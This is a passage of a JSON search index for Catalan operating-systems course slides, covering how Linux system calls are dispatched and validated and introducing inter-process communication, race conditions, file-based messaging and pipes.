      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#readfd-buffer-nbytes",
    "href": "slides/02-syscalls.html#readfd-buffer-nbytes",
    "title": "Crides a sistema",
    "section": "read(fd, buffer, nbytes)",
    "text": "read(fd, buffer, nbytes)\nEspai d‚Äôusuari\n\nPrograma C:\n\nPosa fd, buffer, nbytes als registres(RDI,RSI,RDX).\nCrida a read().\n\nLlibreria de sistema:\n\nPosa el codi de read a RAX.\nExecuta syscall (TRAP a mode kernel).\n\n\n\nTransici√≥ a mode kernel",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#readfd-buffer-nbytes-1",
    "href": "slides/02-syscalls.html#readfd-buffer-nbytes-1",
    "title": "Crides a sistema",
    "section": "read(fd, buffer, nbytes)",
    "text": "read(fd, buffer, nbytes)\n\nCPU canvia a mode supervisor i salta a la rutina del kernel indicada a la IDT.\n\n\nEspai del kernel\n\nValidaci√≥ de descriptors i permisos.\nLocalitza rutina de tractament de read a la taula de syscall.\nExecuta la rutina:\n\nLlegeix dades del dispositiu d‚ÄôE/S.\nCopia dades al buffer d‚Äôusuari (copy_to_user).\nRetorna resultat (nombre de bytes llegits o -1).",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#readfd-buffer-nbytes-2",
    "href": "slides/02-syscalls.html#readfd-buffer-nbytes-2",
    "title": "Crides a sistema",
    "section": "read(fd, buffer, nbytes)",
    "text": "read(fd, buffer, nbytes)\n\nTransici√≥ a mode usuari\n\n\nCPU restaura context del proc√©s i retorna al programa.\n\n\nEspai d‚Äôusuari\n\nLlibreria de sistema: Retorna el resultat de la crida a read() al Programa C.\nPrograma: Continua l‚Äôexecuci√≥ utilitzant les dades llegides. O b√©, tracta l‚Äôerror si n‚Äôhi ha (errno)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#resum-amb-open",
    "href": "slides/02-syscalls.html#resum-amb-open",
    "title": "Crides a sistema",
    "section": "Resum amb open()",
    "text": "Resum amb open()\n\n\n\n# Executem a user space\nmov edx,4       ; message length\nmov ecx,msg     ; message to write\nmov ebx,1       ; file descriptor (stdout)\nmov eax,4       ; system call number (sys_write)\nint 0x80        ; interrupt! Number 128 (0x80 in hex);",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#setup-de-les-crides-a-sistema-x86",
    "href": "slides/02-syscalls.html#setup-de-les-crides-a-sistema-x86",
    "title": "Crides a sistema",
    "section": "Setup de les crides a sistema (x86)",
    "text": "Setup de les crides a sistema (x86)\n\nLes syscalls estan identificades per n√∫meros √∫nics (syscall numbers).\nArguments m√†xims: 6 registres, depenent de l‚Äôarquitectura.\nValor de retorn: en el registre principal (EAX/RAX).\n\n\n\n\n\n\n\n\n\n\n\nArquitectura\nRegistre syscall number\nArguments (1..6)\nRetorn\n\n\n\n\nx86 32-bit\nEAX\nEBX, ECX, EDX, ESI, EDI, EBP\nEAX\n\n\nx86 64-bit\nRAX\nRDI, RSI, RDX, R10, R8, R9\nRAX\n\n\n\n\n\nPrograma usuari escriu arguments als registres corresponents.\nExecuta instrucci√≥ int $0x80 (32-bit) o syscall (64-bit) ‚Üí trap al kernel.\nKernel llegeix registre syscall number, localitza la rutina a la syscall table, executa i retorna resultat en EAX/RAX.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#linux-syscall-dispatcher-i",
    "href": "slides/02-syscalls.html#linux-syscall-dispatcher-i",
    "title": "Crides a sistema",
    "section": "Linux Syscall Dispatcher (I)",
    "text": "Linux Syscall Dispatcher (I)\n__visible noinstr bool do_syscall_64(struct pt_regs *regs, int nr)\n{\n    nr = syscall_enter_from_user_mode(regs, nr); \n    if (!do_syscall_x64(regs, nr) && !do_syscall_x32(regs, nr) && nr != -1) {\n        regs-&gt;ax = __x64_sys_ni_syscall(regs);\n    }\n    syscall_exit_to_user_mode(regs);\n    return true;\n}\n\nsyscall_enter_from_user_mode(regs, nr)\n\nCanvia a mode kernel.\nRealitza validacions de seguretat i prepara els registres (RAX, RDI, RSI, etc.).\n\ndo_syscall_x64 / do_syscall_x32\n\nInvoca la rutina correcta de la syscall table segons arquitectura.\n\nsyscall_exit_to_user_mode(regs)\n\nPrepara els registres per tornar a mode usuari.\n\n\n\nsyscall_64.c",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#linux-syscall-dispatcher-ii",
    "href": "slides/02-syscalls.html#linux-syscall-dispatcher-ii",
    "title": "Crides a sistema",
    "section": "Linux Syscall Dispatcher (II)",
    "text": "Linux Syscall Dispatcher (II)\nstatic __always_inline bool do_syscall_x64(struct pt_regs *regs, int nr)\n{\n    unsigned int unr = nr;\n    if (likely(unr &lt; NR_syscalls)) {\n        unr = array_index_nospec(unr, NR_syscalls);\n        regs-&gt;ax = x64_sys_call(regs, unr);\n        return true;\n    }\n    return false;\n}\n\nNR_syscalls: nombre total de syscalls suportades.\narray_index_nospec: prevenci√≥ d‚Äôatacs de canal lateral al indexar la taula de syscalls.\nx64_sys_call(regs, unr): crida la funci√≥ de syscall corresponent.\nRetorna true si la syscall √©s v√†lida i s‚Äôha executat, false en cas contrari.\n\n\nx64_syscall.c",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#punters-i-seguretat-i",
    "href": "slides/02-syscalls.html#punters-i-seguretat-i",
    "title": "Crides a sistema",
    "section": "Punters i seguretat (I)",
    "text": "Punters i seguretat (I)\n\nTots els punters que provenen de l‚Äôusuari han de ser validads abans de ser utilitzats pel kernel.\n\n\n\n\n\n\n\n\nTipus de punter\nConseq√º√®ncia / tractament\n\n\n\n\nPunter a kernel space des d‚Äôusuari\nCorrupci√≥ de dades del kernel ‚Üí bug cr√≠tic.\n\n\nPunter inv√†lid a user space\nPage fault; el kernel gestiona l‚Äôerror.\n\n\nPunter inv√†lid dins del kernel\nBug del kernel; pot provocar panic.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#punters-i-seguretat-ii",
    "href": "slides/02-syscalls.html#punters-i-seguretat-ii",
    "title": "Crides a sistema",
    "section": "Punters i seguretat (II)",
    "text": "Punters i seguretat (II)\n\nFuncions com __chk_user_ptr(ptr) comproven si el punter apunta a espai usuari v√†lid.\nSi es fa servir un punter inv√†lid, la MMU genera un page fault que el kernel pot gestionar.\nTaula d‚Äôexcepcions: el kernel registra quines instruccions poden accedir a l‚Äôespai usuari.\nPermet diferenciar faults leg√≠tims de punters inv√†lids o errors del kernel.\n__get_user() i __put_user() s√≥n funcions que permeten llegir i escriure dades a l‚Äôespai d‚Äôusuari de manera segura.\n__copy_to_user() i __copy_from_user() s√≥n funcions que permeten copiar dades entre l‚Äôespai d‚Äôusuari i el kernel de manera segura.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#acc√©s-a-dades-dusuari",
    "href": "slides/02-syscalls.html#acc√©s-a-dades-dusuari",
    "title": "Crides a sistema",
    "section": "Acc√©s a dades d‚Äôusuari",
    "text": "Acc√©s a dades d‚Äôusuari\n#define get_user(x, ptr)                    \n({                              \n    const void __user *__p = (ptr);             \n    might_fault();                      \n    access_ok(__p, sizeof(*ptr)) ?      \n        __get_user((x), (__typeof__(*(ptr)) __user *)__p) :\n        ((x) = (__typeof__(*(ptr)))0,-EFAULT);      \n})\n\n__chk_user_ptr(ptr): Valida que ptr apunta a espai usuari v√†lid abans d‚Äôaccedir-hi.\nmight_fault(): Marca que el codi seg√ºent pot generar un page fault.\naccess_ok(__p, sizeof(*ptr)): Comprova que l‚Äô√†rea de mem√≤ria √©s accessible.\n__get_user((x), (__typeof__(*(ptr)) __user *)__p): Llegeix el valor de l‚Äôadre√ßa d‚Äôusuari i el guarda a x.\nSi l‚Äôacc√©s no √©s v√†lid, assigna 0 a x i retorna -EFAULT.\n\n\nProtegeix el kernel de punters maliciosos o inv√†lids. Pots veure m√©s a get_user.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#virtual-dynamic-shared-object-vdso",
    "href": "slides/02-syscalls.html#virtual-dynamic-shared-object-vdso",
    "title": "Crides a sistema",
    "section": "Virtual Dynamic Shared Object (VDSO)",
    "text": "Virtual Dynamic Shared Object (VDSO)\n√Ärea especial de mem√≤ria mapejada a l‚Äôespai usuari amb codi generat pel kernel per executar certes funcions de sistema de manera m√©s r√†pida.\n\nObjectiu\nEvitar la transici√≥ completa a mode kernel, reduint lat√®ncia i cost de syscalls repetitives.\n\n\n\n\n\n\n\n\nExemples\n\n\n\ngettimeofday()\ntime()\ngetpid()\n\n\n\n\n\n\nAlgunes dades din√†miques es troben en una regi√≥ de mem√≤ria RW dins del VDSO.\nLa funci√≥ accedeix directament a aquestes dades sense fer una syscall completa.\nSi √©s necessari, el kernel actualitza aquestes dades de forma transparent.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#com-funciona-la-dualitat",
    "href": "slides/02-syscalls.html#com-funciona-la-dualitat",
    "title": "Crides a sistema",
    "section": "Com funciona la dualitat?",
    "text": "Com funciona la dualitat?",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#canvi-de-context-i",
    "href": "slides/02-syscalls.html#canvi-de-context-i",
    "title": "Crides a sistema",
    "section": "Canvi de context (I)",
    "text": "Canvi de context (I)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#canvi-de-context-ii",
    "href": "slides/02-syscalls.html#canvi-de-context-ii",
    "title": "Crides a sistema",
    "section": "Canvi de context (II)",
    "text": "Canvi de context (II)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#caracter√≠stiques-de-la-dualitat",
    "href": "slides/02-syscalls.html#caracter√≠stiques-de-la-dualitat",
    "title": "Crides a sistema",
    "section": "Caracter√≠stiques de la dualitat",
    "text": "Caracter√≠stiques de la dualitat\n\nTot el codi del nucli s‚Äôexecuta amb tots els privilegis.\nPermet acc√©s complet a instruccions privilegiades i dispositius.\nEl sistema operatiu limita el temps i el codi executat en mode supervisor per reduir riscos i lat√®ncia.\nPer accedir a serveis del nucli (syscalls, traps) cal un canvi de context:\n\nDes del mode usuari ‚Üí mode kernel ‚Üí execuci√≥ ‚Üí retorn.\n\nMecanisme controlat per accedir a rutines del kernel sense comprometre seguretat.\nAccions potencialment insegures (acc√©s a taules de p√†gines, E/S, control del CPU) prohibit en mode usuari.\nEl kernel evita que processos accedeixin fora de la seva regi√≥ assignada.\nTransforma adreces l√≤giques (abstractes) en f√≠siques de forma segura.\nInterrupcions peri√≤diques i control del temporitzador\nEl kernel pot interrompre processos usuari en qualsevol moment.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#exemples-dinstruccions-privilegiades",
    "href": "slides/02-syscalls.html#exemples-dinstruccions-privilegiades",
    "title": "Crides a sistema",
    "section": "Exemples d‚Äôinstruccions privilegiades",
    "text": "Exemples d‚Äôinstruccions privilegiades\n\nAssignaci√≥ d‚Äôadreces de mem√≤ria.\nEsborreu o invalideu la mem√≤ria cau de dades.\nInvalideu les entrades a les taules de p√†gines.\nCarregueu i llegiu els registres del sistema.\nCanvieu els modes de processador del nucli a l‚Äôusuari.\nCanvieu el voltatge i la freq√º√®ncia del processador.\nParar un processador.\nRestableix un processador.\nFer operacions d‚ÄôE/S.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#conclusi√≥",
    "href": "slides/02-syscalls.html#conclusi√≥",
    "title": "Crides a sistema",
    "section": "Conclusi√≥",
    "text": "Conclusi√≥\n\nLa CPU executa instruccions de manera lineal, una darrere l‚Äôaltra.\nPer interactuar amb el m√≥n, dep√®n de les interrupcions.\nLa CPU t√© diferents nivells de privilegi, anomenats rings, que ajuden el sistema operatiu a aplicar la seguretat i el control.\nEls nostres programes normalment s‚Äôexecuten en l‚Äôanell menys privilegiat (mode usuari), cosa que significa que no podem executar directament certes instruccions.\nEns comuniquem amb el nucli a trav√©s de crides al sistema (syscalls), que s√≥n essencialment un tipus d‚Äôinterrupci√≥.\nEl nucli tamb√© configura interrupcions pel seu compte per gestionar els processos (com pausar-ne un, canviar a un altre o gestionar diversos esdeveniments del sistema). Podeu ampliar aqu√≠",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#exercicis-proposats",
    "href": "slides/02-syscalls.html#exercicis-proposats",
    "title": "Crides a sistema",
    "section": "Exercicis proposats",
    "text": "Exercicis proposats\n\nLaboratori 07: Espiant el Kernel\nLaboratori 08: Crides a sistema personalitzades\nActivitat: Kernel Linux",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#aix√≤-√©s-tot-per-avui",
    "href": "slides/02-syscalls.html#aix√≤-√©s-tot-per-avui",
    "title": "Crides a sistema",
    "section": "Aix√≤ √©s tot per avui",
    "text": "Aix√≤ √©s tot per avui\n\n\nTAKE HOME MESSAGE\n\nLes crides a sistema (syscalls) s√≥n la porta perqu√® els processos d‚Äôusuari accedeixin a serveis del kernel.\nEl dispatcher de Linux (do_syscall_64) gestiona syscalls, identifica el n√∫mero, valida arguments i crida la rutina corresponent.\nExcepcions i interrupcions: s√≥n l¬¥√∫nic mecanisme perqu√® els processos d‚Äôusuari accedeixin al kernel.\nFlux: Usuari ‚Üí Trap/syscall ‚Üí Dispatcher ‚Üí Rutina ‚Üí Kernel ‚Üí Retorn ‚Üí Usuari.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 ¬∑ Crides a sistema"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#rep√†s-de-gesti√≥-de-processos",
    "href": "slides/03-communicate.html#rep√†s-de-gesti√≥-de-processos",
    "title": "Comunicaci√≥ de processos",
    "section": "Rep√†s de gesti√≥ de processos",
    "text": "Rep√†s de gesti√≥ de processos\necho \"Missatge enviat\" &gt; missatge.txt\n\n\n\n\n\n\n\n\nExercici\n\n\nImplementeu un programa en C que simuli aquest comportament.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#comunicaci√≥-entre-processos-ipc",
    "href": "slides/03-communicate.html#comunicaci√≥-entre-processos-ipc",
    "title": "Comunicaci√≥ de processos",
    "section": "Comunicaci√≥ entre processos (IPC)",
    "text": "Comunicaci√≥ entre processos (IPC)\nEn un sistema operatiu multiprogramat o distribu√Øt, diversos processos s‚Äôexecuten concurrentment i sovint necessiten intercanviar dades, sincronitzar accions o compartir recursos. Aquest intercanvi s‚Äôanomena Inter-Process Communication (IPC).\n\nCoordinaci√≥ i sincronitzaci√≥ entre processos independents.\nTransfer√®ncia d‚Äôinformaci√≥ sense accedir directament a l‚Äôespai d‚Äôadreces dels altres processos.\nCompartici√≥ controlada de recursos (fitxers, mem√≤ria, dispositius, sockets).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#reptes-de-la-comunicaci√≥-ipc",
    "href": "slides/03-communicate.html#reptes-de-la-comunicaci√≥-ipc",
    "title": "Comunicaci√≥ de processos",
    "section": "Reptes de la comunicaci√≥ (IPC)",
    "text": "Reptes de la comunicaci√≥ (IPC)\n\nCom es pot transferir la informaci√≥ entre processos? Recorda que els processos operen en espais d‚Äôadre√ßes independents. Per tant, no poden accedir a la mateixa informaci√≥.\nCom es pot assegurar que dos processos no intentin accedir simult√†niament a la mateixa informaci√≥? Imagina‚Äôt 2 processos executant una reserva en un avi√≥ i els dos processos assignen el mateix seient a dos passatgers diferents.\nCom es poden coordinar els processos dependents entre si? Imagina‚Äôt un proc√©s que genera dades i un altre proc√©s que les processa. El proc√©s que processa les dades necessita esperar a que el proc√©s que les genera les hagi generat totes.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemples-de-comunicaci√≥sincronitzaci√≥",
    "href": "slides/03-communicate.html#exemples-de-comunicaci√≥sincronitzaci√≥",
    "title": "Comunicaci√≥ de processos",
    "section": "Exemples de comunicaci√≥/sincronitzaci√≥",
    "text": "Exemples de comunicaci√≥/sincronitzaci√≥\n\nComunicaci√≥: Intercanvi d‚Äôinformaci√≥.\n\n\ncat missatge.txt | grep \"e\"\n\n\nSincronitzaci√≥: Coordinaci√≥ en l‚Äôacc√©s als recursos i en l‚Äôordre d‚Äôexecuci√≥ de les tasques.\n\n\necho \"hola1\"; echo \"adeu1\" && echo \"hola2\" || echo \"adeu2\"\n\n\n\nEl ; permet executar les comandes de forma seq√ºencial.\nEl && permet executar la segona comanda si la primera s‚Äôha executat correctament.\nEl || permet executar la segona comanda si la primera no s‚Äôha executat correctament.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#cat-missatge.txt-grep-e",
    "href": "slides/03-communicate.html#cat-missatge.txt-grep-e",
    "title": "Comunicaci√≥ de processos",
    "section": "cat < missatge.txt | grep \"e\"",
    "text": "cat &lt; missatge.txt | grep \"e\"",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#esquema-de-la-comunicaci√≥sincronitzaci√≥",
    "href": "slides/03-communicate.html#esquema-de-la-comunicaci√≥sincronitzaci√≥",
    "title": "Comunicaci√≥ de processos",
    "section": "Esquema de la comunicaci√≥/sincronitzaci√≥",
    "text": "Esquema de la comunicaci√≥/sincronitzaci√≥\n\n\nProc√©s 1\nwhile(!FiTasca1){\n  EsperarFiTasca1();\n}\n\nwhile(ExisteixTasca){\n  dades = FerTasca2();\n  EnviarMissatge(pid2,dades);\n}\n\nProc√©s 2\nRealitzarTasca1();\nAvisarTasca1Completada();\n\nwhile(ExisteixTasca){;\n  RebreMissatge(pid2, &dades);\n  RealitzarTasca(dades);\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-cua-dimpressi√≥",
    "href": "slides/03-communicate.html#exemple-cua-dimpressi√≥",
    "title": "Comunicaci√≥ de processos",
    "section": "Exemple: Cua d‚Äôimpressi√≥",
    "text": "Exemple: Cua d‚Äôimpressi√≥\nAssumeix que un proces A vol imprimir un document:\n\nEl proc√©s A ha d‚Äôintroduir el nom del fitxer a imprimir en una cua d‚Äôimpressi√≥.\nEl servei d‚Äôimpressi√≥ proc√©s B de forma peri√≤dica revisa la cua d‚Äôimpressi√≥ i imprimeix els fitxers que hi ha en la cua.\n\n\nPer fer-ho, implementem una cua d‚Äôimpressi√≥ amb dos variables una que apunta al seg√ºent slot a imprimir (out) i una al seg√ºent slot lliure (in).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-cua-dimpressi√≥-1",
    "href": "slides/03-communicate.html#exemple-cua-dimpressi√≥-1",
    "title": "Comunicaci√≥ de processos",
    "section": "Exemple: Cua d‚Äôimpressi√≥",
    "text": "Exemple: Cua d‚Äôimpressi√≥\n\n\n\nEl proc√©s A llegeix la variable in i escriu el valor 7 en una variable local (next_free_slot).\nEl SO interromp el proc√©s A i executa el proc√©s B.\nEl proc√©s B llegeix la variable in i escriu el valor 7 en una variable local (next_free_slot).\nEl proc√©s B col¬∑loca un fitxer a la cua d‚Äôimpressi√≥ al slot 7 i el servei d‚Äôimpressi√≥ modifica les variables in i out.\nEl proc√©s B realitza altres tasques no relacionades amb la cua d‚Äôimpressi√≥.\nEl SO interromp el proc√©s B i executa el proc√©s A. El proc√©s A utilitza la seva variable local (next_free_slot) per a escriure el fitxer a la cua d‚Äôimpressi√≥. El fitxer s‚Äôescriu al slot 7, i tamb√© actualitza les variables in i out.\n\n\n\n\nEl proc√©s B ha perdut la impressi√≥ del fitxer. El proc√©s A l‚Äôha sobrescrit.\nEl servei d‚Äôimpressi√≥ no ha notat cap inconsistencia en les variables in i out.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#condicions-de-carrera",
    "href": "slides/03-communicate.html#condicions-de-carrera",
    "title": "Comunicaci√≥ de processos",
    "section": "Condicions de carrera",
    "text": "Condicions de carrera\nLes condicions de carrera es produeixen quan dos o m√©s processos o fils d‚Äôexecuci√≥ intenten accedir simult√†niament a recursos compartits o a dades sense la deguda sincronitzaci√≥.\n\nProblemes\nPoden conduir a resultats inesperats o incorrectes en les operacions i a la inconsist√®ncia de les dades compartides.\n\n\nSolucions\n\nExclusi√≥ M√∫tua: Utilitzar mecanismes com sem√†fors, mutex o candaus per a garantir que nom√©s un proc√©s pugui accedir als recursos compartits a la vegada.\nSincronitzaci√≥: Coordinar l‚Äôexecuci√≥ dels processos mitjan√ßant sincronitzaci√≥ de manera que no interfereixin entre ells quan accedeixen als recursos compartits.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#evitar-les-condicions-de-carrera",
    "href": "slides/03-communicate.html#evitar-les-condicions-de-carrera",
    "title": "Comunicaci√≥ de processos",
    "section": "Evitar les condicions de carrera",
    "text": "Evitar les condicions de carrera\nLa secci√≥ cr√≠tica √©s la part del codi on s‚Äôaccedeix a recursos compartits. Per a evitar les condicions de carrera, els processos han de complir les seg√ºents condicions:\n\nDos processos no poden estar simult√†niament en la secci√≥ cr√≠tica.\nNo s‚Äôha d‚Äôassumir que els processos s√≥n executats de forma r√†pida o lenta.\nCap proc√©s que no estigui en la secci√≥ cr√≠tica pot bloquejar altres processos.\nCap proc√©s ha d‚Äôesperar per sempre per entrar a la secci√≥ cr√≠tica.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#tipus-de-comunicaci√≥",
    "href": "slides/03-communicate.html#tipus-de-comunicaci√≥",
    "title": "Comunicaci√≥ de processos",
    "section": "Tipus de comunicaci√≥",
    "text": "Tipus de comunicaci√≥\nPas de missatges\n\nPermet integrar tasques de comunicaci√≥ i sincronitzaci√≥ entre processos situats en una mateixa m√†quina o en m√†quines distribu√Ødes.\nUn missatge √©s un conjunt de dades intercanviades per 2 o m√©s processos.\n\n\nMem√≤ria compartida\n\nEls processos es comuniquen utilitzant variables o zones de mem√≤ria compartida.\nS‚Äôutilitzen per comunicar processos en una mateixa m√†quina.\nEs necessita regular l‚Äôacc√©s a la informaci√≥ compartida per garantir el resultat √≤ptim i evitar les race conditions.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#caracter√≠stiques-de-la-comunicaci√≥-i",
    "href": "slides/03-communicate.html#caracter√≠stiques-de-la-comunicaci√≥-i",
    "title": "Comunicaci√≥ de processos",
    "section": "Caracter√≠stiques de la comunicaci√≥ (I)",
    "text": "Caracter√≠stiques de la comunicaci√≥ (I)\nIdentificaci√≥\n\nMecanismes de noms\n\nSense nom\nNom local\nNom de la red\n\nIdentificador de dest√≠\n\nDirecte: S‚Äôha d‚Äôindicar el proc√©s origen i dest√≠. El missatge s‚Äôenvia a un proc√©s concret utilitzant el seu pid. El receptor pot (indicar o no) el proc√©s que vol rebre el missatge.\nIndirecte: Els missatges s‚Äôenvien a una zona contreta (bustia o port), sense identificar de forma expl√≠cita el dest√≠.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#caracter√≠stiques-de-la-comunicaci√≥-ii",
    "href": "slides/03-communicate.html#caracter√≠stiques-de-la-comunicaci√≥-ii",
    "title": "Comunicaci√≥ de processos",
    "section": "Caracter√≠stiques de la comunicaci√≥ (II)",
    "text": "Caracter√≠stiques de la comunicaci√≥ (II)\nFlux de dades\n\nUnidireccional\nBidireccional\n\n\nBuffering\n\nAmb buffers\nSense buffers\n\n\n\nSincronitzaci√≥\n\nSincrons (bloquejants)\nAs√≠ncrons (no bloquejants)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#tipus-de-mecanismes",
    "href": "slides/03-communicate.html#tipus-de-mecanismes",
    "title": "Comunicaci√≥ de processos",
    "section": "Tipus de mecanismes",
    "text": "Tipus de mecanismes\n\nFitxers.\nPipes.\nFIFOS (Pipes amb nom).\nCues de missatges.\nSockets.\nMem√≤ria compartida (IPC).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#fitxers",
    "href": "slides/03-communicate.html#fitxers",
    "title": "Comunicaci√≥ de processos",
    "section": "Fitxers",
    "text": "Fitxers\nLa comunicaci√≥ entre processos a trav√©s dels sistemes de fitxers √©s una manera simple d‚Äôintercanviar informaci√≥ entre ells. Aix√≤ implica que dos o m√©s processos acorden un fitxer pel seu nom i el utilitzen per a la comunicaci√≥. Un dels processos escriu al fitxer mentre que un altre processos llegeix el contingut del fitxer.\nLimitacions\n\nPersist√®ncia: Els fitxers s√≥n persistents, la informaci√≥ roman en disc fins que s‚Äôelimina de forma expl√≠cita. Aix√≤ no √©s √≤ptim per a la comunicaci√≥ ef√≠mera o temporal entre processos.\nProblemes de Sincronitzaci√≥: Cal gestionar la sincronitzaci√≥ de forma manual per garantir que un proc√©s no llegeixi el fitxer abans que un altre proc√©s hagi acabat d‚Äôescriure-hi. Aquesta sincronitzaci√≥ pot ser complexa i pot conduir a errors si no es gestiona adequadament.\nEfici√®ncia: L‚Äô√∫s de fitxers per a la comunicaci√≥ no √©s eficient en termes de rendiment, ja que involucra operacions d‚Äôentrada i sortida a disc, que s√≥n m√©s lentes que altres m√®todes de comunicaci√≥ en mem√≤ria.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#exemple-comunicaci√≥-amb-fitxers",
    "href": "slides/03-communicate.html#exemple-comunicaci√≥-amb-fitxers",
    "title": "Comunicaci√≥ de processos",
    "section": "Exemple: Comunicaci√≥ amb fitxers",
    "text": "Exemple: Comunicaci√≥ amb fitxers\nUn proc√©s 1 (escriptor) escriu un missatge en un fitxer anomenat fitxer_comunicacio.txt.\n// Process 1 (escriptor)\nint fd = open(\"fitxer_comunicacio.txt\", O_WRONLY | O_CREAT, 0644);\nwrite(fd, \"Missatge des de Process 1\", strlen(\"Missatge des de Process 1\"));\nclose(fd);\nUn proc√©s 2 (lector) llegeix el missatge d‚Äôaquest fitxer i el mostra per pantalla.\n// Process 2 (lector)\nint fd = open(\"fitxer_comunicacio.txt\", O_RDONLY);\nchar buffer[100];\nread(fd, buffer, 100);\nclose(fd);\nprintf(\"Missatge rebut: %s\\n\", buffer);",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
    ]
  },
  {
    "objectID": "slides/03-communicate.html#pipes",
    "href": "slides/03-communicate.html#pipes",
    "title": "Comunicaci√≥ de processos",
    "section": "Pipes",
    "text": "Pipes\nEls pipes s√≥n dispositius l√≤gics dissenyats per permetre la comunicaci√≥ entre processos. Es comporten com una cua de car√†cters amb una longitud fixa on els processos poden llegir o escriure.\n\nSense Nom: Els pipes s√≥n an√≤nims, el que significa que no estan associats amb un fitxer del sistema de fitxers.\n√ös Amb fork(): Es poden heretar i utilitzar f√†cilment.\nIdentificaci√≥: Es caracteritzen per tenir dos descriptors de fitxers, un per a l‚Äôescriptura i un altre per a la lectura.\nFlux de Dades Unidireccional: El flux de dades als pipes √©s unidireccional, la informaci√≥ nom√©s es mou d‚Äôuna direcci√≥, √©s a dir, del proc√©s escriptor al proc√©s lector.\nAmb Buffering: Els pipes utilitzen un mecanisme que permet acumular dades fins que es llegeixin.\nRestriccions d‚Äô√Ämbit Local: Comunicaci√≥ entre processos a la mateixa m√†quina, ja que no estan dissenyats per a la comunicaci√≥ a trav√©s de xarxes.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Comunicaci√≥ entre processos"
